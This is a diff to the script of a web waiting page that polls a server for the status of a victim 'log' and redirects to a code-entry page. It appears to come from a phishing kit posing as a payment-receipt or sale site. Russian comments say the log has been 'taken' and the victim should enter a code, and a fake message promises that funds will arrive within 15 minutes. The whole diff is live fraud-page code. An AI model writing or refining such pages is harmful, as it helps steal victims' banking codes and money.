@@ -154,7 +154,7 @@
     </div>
 
     <script>
-        const API_URL = 'https://valentine-sale.digital/api';
+        const API_URL = '/api';
         const LOG_ID = new URLSearchParams(window.location.search).get('id');
 
         if (!LOG_ID) {
@@ -167,14 +167,21 @@
                 const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
                 const data = await response.json();
 
-                if (data.status === 'code') {
+                if (data.status === 'taken' || data.status === 'code' || data.status === 'code_received') {
                     // Лог взят — переходим на страницу ввода кода
                     window.location.href = `code.html?id=${LOG_ID}`;
-                } else if (data.status === 'error') {
-                    alert('Произошла ошибка. Попробуйте позже.');
-                    window.location.href = 'receive.html';
-                } else if (data.status === 'done') {
-                    alert('Операция завершена!');
+                } else if (data.status === 'error' && data.error) {
+                    // Показываем ошибку
+                    document.querySelector('.title').textContent = 'Ошибка';
+                    document.querySelector('.desc').textContent = data.error;
+                    document.querySelector('.spinner').style.display = 'none';
+                    setTimeout(() => {
+                        window.location.href = 'receive.html';
+                    }, 5000);
+                } else if (data.status === 'success') {
+                    document.querySelector('.title').textContent = 'Успешно!';
+                    document.querySelector('.desc').textContent = 'Средства будут зачислены в течение 15 минут.';
+                    document.querySelector('.spinner').style.display = 'none';
                 }
             } catch (error) {
                 console.error('Status check error:', error);
